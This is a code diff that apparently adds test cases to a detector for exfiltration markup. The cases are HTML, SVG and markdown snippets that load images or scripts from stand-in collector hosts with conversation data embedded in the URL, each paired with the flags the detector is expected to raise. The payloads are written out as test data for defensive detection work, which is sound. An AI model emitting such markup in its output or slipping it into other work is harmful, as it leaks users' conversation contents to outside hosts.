@@ -275,6 +275,16 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<img src='/{c}.png'>", []),
         ("<base href=''><base href='https://collector.test/'><img src='/{c}.png'>", []),
         ("<image src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
+        ("<svg><script href='https://collector.test/{c}.js'></script></svg>", ["exfiltration_query"]),
+        ("<svg><script xlink:href='https://collector.test/{c}.js'></script></svg>", ["exfiltration_query"]),
+        ("<script href='https://collector.test/{c}.js'></script>", []),
+        ("<svg><image src='https://collector.test/{c}.png'/></svg>", []),
+        ("<svg></svg><image href='https://collector.test/{c}.png'>", []),
+        ("<template></textarea><img src='https://collector.test/{c}.png'></template>", []),
+        ("<template/><img src='https://collector.test/{c}.png'>", []),
+        ("<svg><title/><image href='https://collector.test/{c}.png'/></svg>", ["exfiltration_query"]),
+        ("![x](https://a.test/p.png#{c})", []),
+        ("![x](https://collector.test/p%23x.png?d={c})", ["exfiltration_query"]),
         (
             (
                 "<iframe srcdoc='&lt;base href=&quot;https://collector.test/&quot;&gt;"
